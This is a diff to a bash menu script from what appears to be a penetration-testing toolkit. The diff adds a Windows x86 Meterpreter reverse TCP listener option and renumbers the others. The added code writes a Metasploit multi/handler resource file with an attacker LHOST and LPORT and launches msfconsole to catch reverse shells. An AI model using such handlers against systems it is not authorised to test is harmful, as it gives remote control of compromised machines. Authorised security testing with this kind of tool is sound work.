@@ -244,18 +244,20 @@ listeners()
    echo "	  |---------------------------------------------|"
    echo "	  |    🖥️ ${GREEN} 1 ${BLUE}Windows Meterpreter Reverse TCP.    ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🐧${GREEN} 2 ${BLUE}Linux Meterpreter Reverse TCP.      ${YELLOW}|"
+   echo "	  |    🖥️ ${GREEN} 2 ${BLUE}Windows x86 Meterpreter Reverse TCP.${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🍎${GREEN} 3 ${BLUE}OSX Reverse TCP listener.           ${YELLOW}|"
+   echo "	  |    🐧${GREEN} 3 ${BLUE}Linux Meterpreter Reverse TCP.      ${YELLOW}|"
    echo "	  |---------------------------------------------|"
-   echo "	  |    🤖${GREEN} 4 ${BLUE}Android Reverse TCP listener.       ${YELLOW}|"
+   echo "	  |    🍎${GREEN} 4 ${BLUE}OSX Reverse TCP listener.           ${YELLOW}|"
+   echo "	  |---------------------------------------------|"
+   echo "	  |    🤖${GREEN} 5 ${BLUE}Android Reverse TCP listener.       ${YELLOW}|"
    echo "	  |---------------------------------------------|"
    echo "	  |    🚪${GREEN} q ${BLUE}Quit to the main menu.              ${YELLOW}|"
    echo "	  |_____________________________________________${YELLOW}|${GREEN}"
    echo	
    errors
    echo "${GREEN}"
-   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,q]    " opt
+   read -n1 -p "     	  What do you want to do? Choose: [1,2,3,4,5,q]    " opt
    echo
    echo
    locals
@@ -282,6 +284,26 @@ listeners()
             ;;
         2)
             echo
+            touch $wdir/meterpreter.rc
+            echo "    ${FGC}  Crafting a Windows Meterpreter Reverse TCP Listener :    ${NC}${YELLOW}"
+            echo use multi/handler > $wdir/meterpreter_windows.rc
+            echo set PAYLOAD windows/meterpreter/reverse_tcp >> $wdir/meterpreter_windows.rc
+            prompt_ip_port
+            echo set LHOST $attackerip >> $wdir/meterpreter_windows.rc
+            echo set LPORT $attackerport >> $wdir/meterpreter_windows.rc
+            echo run >> $wdir/meterpreter_windows.rc
+            echo
+	    echo "${GREEN}            ---> Saved to $wdir/meterpreter_windows.rc."
+	    echo "${GREEN}            ---> Finished crafting listener."
+	    sleep 1
+	    echo
+	    echo "${YELLOW}            ---> Starting listener on LHOST $attackerip LPORT $attackerport."
+            launch_msfconsole "$wdir/meterpreter_windows.rc"
+	    sleep 2
+            goto listen;
+            ;;
+        3)
+            echo
             touch $wdir/meterpreter_linux.rc
             echo "    ${FGC}    Crafting a Linux Meterpreter Reverse TCP Listener :     ${NC}${YELLOW}"
             echo use exploit/multi/handler > $wdir/meterpreter_linux.rc
@@ -300,7 +322,7 @@ listeners()
 	    sleep 2
             goto listen;
             ;;
-        3)
+        4)
             echo
             touch $wdir/meterpreter_mac.rc
             echo "          ${FGC}    Crafting an OSX Reverse TCP Listener :     ${NC}${YELLOW}"
@@ -320,7 +342,7 @@ listeners()
 	    sleep 2
             goto listen;
             ;;
-        4)
+        5)
             echo
             touch $wdir/meterpreter_droid.rc
             echo "         ${FGC}     Crafting a Android Reverse TCP Listener :     ${NC}${YELLOW}"
